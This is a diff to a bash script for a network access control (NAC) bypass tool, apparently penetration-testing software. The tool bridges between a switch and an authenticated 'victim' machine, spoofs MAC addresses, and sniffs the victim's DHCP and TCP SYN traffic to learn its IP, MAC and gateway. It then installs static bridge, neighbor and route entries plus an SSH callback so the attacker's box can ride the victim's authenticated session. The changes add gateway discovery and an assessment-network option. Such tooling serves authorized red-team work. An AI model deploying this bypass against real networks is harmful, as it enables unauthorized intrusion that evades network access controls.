@@ -11,7 +11,7 @@ set -e
 # -----
 
 ## Variables
-VERSION="0.6.5-1787207350"
+VERSION="0.7.0"
 RANDOMIZE=0
 
 CMD_ARPTABLES=/usr/sbin/arptables
@@ -54,6 +54,9 @@ else
 fi
 
 TEMP_FILE=/tmp/tcpdump.pcap
+GW_TEMP_FILE=/tmp/nac_bypass_gateway.pcap
+DHCP_TEMP_FILE=/tmp/nac_bypass_dhcp.pcap
+DHCP_CAPTURE_PID=""
 OPTION_RESPONDER=0
 OPTION_SSH=0
 OPTION_AUTONOMOUS=0
@@ -88,6 +91,17 @@ PORT_UDP_MULTICAST=5553
 DPORT_SSH=50222 #SSH call back port use victimip:50022 to connect to attackerbox:sshport
 PORT_SSH=50022
 RANGE=61000-62000 #Ports for my traffic on NAT
+AUTO_ROUTE_PREFIX="" # Victim prefix, learned through DHCP or supplied with -p
+TARGET_ROUTE_RANGE="" # Assessment network supplied with -n
+
+CleanupCapture() {
+    if [ -n "$DHCP_CAPTURE_PID" ]; then
+        kill "$DHCP_CAPTURE_PID" 2>/dev/null || true
+        wait "$DHCP_CAPTURE_PID" 2>/dev/null || true
+        DHCP_CAPTURE_PID=""
+    fi
+}
+trap CleanupCapture EXIT
 
 ## display usage hints
 Usage() {
@@ -97,9 +111,11 @@ Usage() {
     echo "    -a          autonomous mode"
     echo "    -c          start connection setup only"
     echo "    -g <MAC>    set gateway MAC address (GWMAC) manually"
-    echo "    -t <MAC>    set target (printer or computer) MAC address (COMMAC) manually"
-    echo "    -T <IP>     set target (printer or computer) IP address (COMIP) manually"
+    echo "    -t <MAC>    set authenticated victim MAC address (COMMAC) manually"
+    echo "    -T <IP>     set authenticated victim IP address (COMIP) manually"
     echo "    -f <RANGE>  filter out all outbound connection except on this range (cautious mode, for Red Team)"
+    echo "    -n <CIDR>   route this assessment network through the learned gateway"
+    echo "    -p <PREFIX> victim subnet prefix for gateway discovery (example: -p 25)"
     echo "    -s <IP>     set source IP address for communication with COMP. WARNING: IP address must exist, for supplicant ARP request to succeed"
     echo "    -h          display this help"
     echo "    -i          start initial setup only"
@@ -140,7 +156,7 @@ IsValidIp() {
 
 ## Check if we got all needed parameters
 CheckParams() {
-    while getopts ":1:2:acg:f:s:t:T:hirRS" opts
+    while getopts ":1:2:acg:f:n:p:s:t:T:hirRS" opts
     do
         case "$opts" in
             "1")
@@ -166,6 +182,12 @@ CheckParams() {
                 ;;
             "f")
                 RESTRICT_TO_DEST_RANGE=$OPTARG
+                ;;
+            "n")
+                TARGET_ROUTE_RANGE=$OPTARG
+                ;;
+            "p")
+                AUTO_ROUTE_PREFIX=$OPTARG
                 ;;
             "s")
                 TO_COMP_SOURCE_IP=$OPTARG
@@ -208,15 +230,16 @@ InitialSetup() {
         echo
     fi
 
-    # Stop NetworkManager (best-effort: may already be stopped or not installed)
-    systemctl stop NetworkManager.service 2>/dev/null || true
-    # Disable IPv6 temporarly
-    SYSCTL_SETTING_IPv6=$(sysctl -n net.ipv6.conf.all.disable_ipv6)
-    if [ "$SYSCTL_SETTING_IPv6" -eq 0 ]; then
-        sysctl -w net.ipv6.conf.all.disable_ipv6=1
+    # Keep NetworkManager available for a Wi-Fi management/AP interface while
+    # ensuring it does not configure the transparent Ethernet bridge members.
+    nmcli device set "$SWINT" managed no 2>/dev/null || true
+    nmcli device set "$COMPINT" managed no 2>/dev/null || true
+    if pgrep -af dhcpcd 2>/dev/null | grep -Eq "dhcpcd:.*(${SWINT}|${COMPINT})"; then
+        echo -e "$WARN [ ! ] dhcpcd still manages a bridge port. Add 'denyinterfaces $SWINT $COMPINT' to /etc/dhcpcd.conf and reboot.$TXTRST"
+        exit 1
     fi
-    # Reset DNS resolver
-    echo "" > /etc/resolv.conf
+    sysctl -w "net.ipv6.conf.${SWINT}.disable_ipv6=1" >/dev/null
+    sysctl -w "net.ipv6.conf.${COMPINT}.disable_ipv6=1" >/dev/null
 
     # Turn off multicast to prevent initial IGMP messages
     ip link set $SWINT multicast off
@@ -276,8 +299,11 @@ InitialSetup() {
         echo -e "$WARN [ ! ] br_netfilter not available, continuing without bridge iptables support$TXTRST"
     fi
 
-    ifconfig $COMPINT 0.0.0.0 up promisc # bring up comp interface
-    ifconfig $SWINT 0.0.0.0 up promisc # bring up switch interface
+    # ifconfig with 0.0.0.0 does not reliably remove DHCP addresses/routes.
+    ip -4 addr flush dev "$COMPINT"
+    ip -4 addr flush dev "$SWINT"
+    ip link set dev "$COMPINT" up promisc on
+    ip link set dev "$SWINT" up promisc on
 
     if [ "$RANDOMIZE" -eq 0 ]; then
         macchanger -m 00:12:34:56:78:90 $BRINT # Swap MAC of bridge to an initialisation value
@@ -291,6 +317,13 @@ InitialSetup() {
 
     ## Set default iptables forward policy to ACCEPT to avoid bridge from being non functional
     $CMD_IPTABLES -P FORWARD ACCEPT
+
+    # Opportunistically capture a fresh DHCP exchange. Option 1 supplies the
+    # victim prefix needed to distinguish on-link traffic from gateway traffic.
+    rm -f "$DHCP_TEMP_FILE"
+    tcpdump -i "$COMPINT" -s0 -U -w "$DHCP_TEMP_FILE" \
+        'udp and (port 67 or port 68)' >/dev/null 2>&1 &
+    DHCP_CAPTURE_PID=$!
 
     if [ "$OPTION_AUTONOMOUS" -eq 0 ]; then
         echo
@@ -324,28 +357,78 @@ ConnectionSetup() {
         echo
     fi
 
-    ## PCAP and look for SYN packets coming from the victim PC to get the source IP, source mac, and gateway MAC
-    # TODO: Replace this with tcp SYN OR (udp && not broadcast? need to tell whos source and whos dest)
-    # TODO: Replace with actually pulling from the source interface?
-
-    if [[ -n "$COMPMAC" && -n "$COMIP" && -n "$GWMAC" ]]; then
-        echo -e "$INFO [ * ] Info: COMPMAC: $COMPMAC, GWMAC: $GWMAC, COMIP: $COMIP $TXTRST"
-        echo -e "$INFO [ * ] Skip packet capture as values are manually provided $TXTRST"
+    ## Only frames entering Linux from COMPINT can identify the victim. Without
+    ## -Q in, a network-originated SYN can reverse victim/gateway detection.
+    if [[ -n "$COMPMAC" && -n "$COMIP" ]]; then
+        echo -e "$INFO [ * ] Victim values supplied manually: COMPMAC=$COMPMAC COMIP=$COMIP$TXTRST"
     else
-        echo -e "$INFO [ * ] Listening for TCP traffic...$TXTRST"
-        tcpdump -i $COMPINT -s0 -w $TEMP_FILE -c1 'tcp[13] & 2 != 0'
+        echo -e "$INFO [ * ] Waiting up to 120 seconds for a victim-originated TCP SYN on $COMPINT...$TXTRST"
+        rm -f "$TEMP_FILE"
+        if ! timeout 120 tcpdump -Q in -i "$COMPINT" -s0 -w "$TEMP_FILE" \
+            -c1 'tcp[13] & 2 != 0'; then
+            echo -e "$WARN [ ! ] No victim-originated SYN captured. Generate victim traffic or use -T and -t.$TXTRST"
+            exit 1
+        fi
     fi
 
     if [ -z "$COMPMAC" ]; then
         COMPMAC=`tcpdump -r $TEMP_FILE -nne -c 1 tcp | awk '{print $2","$4$10}' | cut -f 1-4 -d.| awk -F ',' '{print $1}'`
     fi
 
-    if [ -z "$GWMAC" ]; then
-        GWMAC=`tcpdump -r $TEMP_FILE -nne -c 1 tcp | awk '{print $2","$4$10}' |cut -f 1-4 -d.| awk -F ',' '{print $2}'`
-    fi
-
     if [ -z "$COMIP" ]; then
         COMIP=`tcpdump -r $TEMP_FILE -nne -c 1 tcp | awk '{print $3","$4$10}' |cut -f 1-4 -d.| awk -F ',' '{print $3}'`
+    fi
+
+    if [ -n "$DHCP_CAPTURE_PID" ]; then
+        kill "$DHCP_CAPTURE_PID" 2>/dev/null || true
+        wait "$DHCP_CAPTURE_PID" 2>/dev/null || true
+        DHCP_CAPTURE_PID=""
+    fi
+    if [ -z "$AUTO_ROUTE_PREFIX" ] && [ -s "$DHCP_TEMP_FILE" ]; then
+        DHCP_SUBNET_MASK=$(tcpdump -nn -vvv -r "$DHCP_TEMP_FILE" \
+            'udp port 67 or udp port 68' 2>/dev/null \
+            | sed -n 's/.*Subnet-Mask Option 1, length 4: \([0-9.]*\).*/\1/p' \
+            | tail -n 1)
+        if [ -n "$DHCP_SUBNET_MASK" ]; then
+            AUTO_ROUTE_PREFIX=$(python3 - "$DHCP_SUBNET_MASK" <<'PY'
+import ipaddress
+import sys
+print(ipaddress.IPv4Network("0.0.0.0/" + sys.argv[1]).prefixlen)
+PY
+)
+        fi
+    fi
+    if [ -n "$AUTO_ROUTE_PREFIX" ]; then
+        if ! [[ "$AUTO_ROUTE_PREFIX" =~ ^[0-9]+$ ]] || \
+           [ "$AUTO_ROUTE_PREFIX" -lt 0 ] || [ "$AUTO_ROUTE_PREFIX" -gt 32 ]; then
+            echo -e "$WARN [ ! ] Invalid victim prefix: $AUTO_ROUTE_PREFIX$TXTRST"
+            exit 1
+        fi
+        AUTO_ROUTE_NETWORK=$(python3 - "$COMIP" "$AUTO_ROUTE_PREFIX" <<'PY'
+import ipaddress
+import sys
+print(ipaddress.ip_network(f"{sys.argv[1]}/{sys.argv[2]}", strict=False))
+PY
+)
+        echo -e "$INFO [ * ] Victim subnet: $AUTO_ROUTE_NETWORK$TXTRST"
+    fi
+
+    ## A gateway MAC must come from a separate victim packet addressed outside
+    ## the victim subnet; the first SYN may instead target an on-link host.
+    if [ -z "$GWMAC" ]; then
+        if [ -z "$AUTO_ROUTE_PREFIX" ]; then
+            echo -e "$WARN [ ! ] Victim prefix unknown. Reconnect for DHCP or use -p PREFIX.$TXTRST"
+            exit 1
+        fi
+        echo -e "$INFO [ * ] Waiting up to 120 seconds for victim traffic outside $AUTO_ROUTE_NETWORK...$TXTRST"
+        rm -f "$GW_TEMP_FILE"
+        if ! timeout 120 tcpdump -Q in -i "$COMPINT" -s0 -w "$GW_TEMP_FILE" \
+            -c1 "ether src $COMPMAC and tcp[tcpflags] & tcp-syn != 0 and not dst net $AUTO_ROUTE_NETWORK"; then
+            echo -e "$WARN [ ! ] No off-subnet victim SYN captured. Generate one or use -g GATEWAY_MAC.$TXTRST"
+            exit 1
+        fi
+        GWMAC=$(tcpdump -r "$GW_TEMP_FILE" -nne -c1 tcp 2>/dev/null \
+            | awk '{gsub(/,/, "", $4); print $4}')
     fi
 
     if [ "$OPTION_AUTONOMOUS" -eq 0 ]; then
@@ -368,6 +451,14 @@ ConnectionSetup() {
 
     if ! IsValidIp "$COMIP"; then
         echo -e "$WARN [ ! ] Could not determine a valid victim IP address (COMIP='$COMIP'). Re-run with -T <IP> to set it manually.$TXTRST"
+        exit 1
+    fi
+    if [ "${COMPMAC,,}" = "${GWMAC,,}" ]; then
+        echo -e "$WARN [ ! ] Gateway MAC equals victim MAC; refusing ambiguous setup.$TXTRST"
+        exit 1
+    fi
+    if [ -z "$TARGET_ROUTE_RANGE" ] && [ -z "$RESTRICT_TO_DEST_RANGE" ]; then
+        echo -e "$WARN [ ! ] Supply an assessment network with -n CIDR (or -f CIDR).$TXTRST"
         exit 1
     fi
 
@@ -405,13 +496,34 @@ ConnectionSetup() {
         route add -host $COMIP dev $BRINT
     fi
 
-    ## Create default routes so we can route traffic - all traffic goes to the bridge gateway and this traffic gets Layer 2 sent to GWMAC
-    arp -s -i $BRINT $BRGW $GWMAC
-    # In case filter-out mode is specified, we only route traffic in the defined range
+    ## Resolve and pin the verified gateway/victim identities to their known
+    ## physical bridge sides. A neighbor entry alone does not select a port.
+    ip neigh replace "$BRGW" lladdr "$GWMAC" nud permanent dev "$BRINT"
+    bridge fdb del "$GWMAC" dev "$COMPINT" master 2>/dev/null || true
+    bridge fdb replace "$GWMAC" dev "$SWINT" master static
+    bridge fdb replace "$COMPMAC" dev "$COMPINT" master static
+
+    # Cautious mode remains both a route and an outbound destination filter.
     if [ -n "$RESTRICT_TO_DEST_RANGE" ]; then
-        ip route add $RESTRICT_TO_DEST_RANGE via $BRGW dev $BRINT metric 10
-    else
-        ip route add default via $BRGW dev $BRINT metric 10
+        ip route replace "$RESTRICT_TO_DEST_RANGE" via "$BRGW" dev "$BRINT" onlink metric 10
+    fi
+    if [ -n "$TARGET_ROUTE_RANGE" ]; then
+        if ! NORMALIZED_TARGET_RANGE=$(python3 - "$TARGET_ROUTE_RANGE" <<'PY'
+import ipaddress
+import sys
+print(ipaddress.IPv4Network(sys.argv[1], strict=False))
+PY
+); then
+            echo -e "$WARN [ ! ] Invalid assessment CIDR: $TARGET_ROUTE_RANGE$TXTRST"
+            exit 1
+        fi
+        TARGET_ROUTE_RANGE=$NORMALIZED_TARGET_RANGE
+        ip route replace "$TARGET_ROUTE_RANGE" via "$BRGW" dev "$BRINT" onlink metric 10
+        if ! ip route show "$TARGET_ROUTE_RANGE" | grep -q "via $BRGW dev $BRINT"; then
+            echo -e "$WARN [ ! ] Assessment route verification failed.$TXTRST"
+            exit 1
+        fi
+        echo -e "$SUCC [ + ] Route installed: $TARGET_ROUTE_RANGE via $BRGW dev $BRINT$TXTRST"
     fi
 
     ## SSH CALLBACK if we receive inbound on br0 for VICTIMIP:DPORT forward to BRIP on SSH
@@ -493,7 +605,7 @@ ConnectionSetup() {
     $CMD_IPTABLES -D OUTPUT -o $SWINT -j DROP
 
     ## Housecleaning
-    rm -f "$TEMP_FILE"
+    rm -f "$TEMP_FILE" "$GW_TEMP_FILE" "$DHCP_TEMP_FILE"
 
     ## All done!
     if [ "$OPTION_AUTONOMOUS" -eq 0 ]; then
@@ -534,7 +646,7 @@ Reset() {
 }
 
 ## Main
-CheckParams $@
+CheckParams "$@"
 CheckRoot
 
 if [ "$OPTION_RESET" -eq 1 ]; then
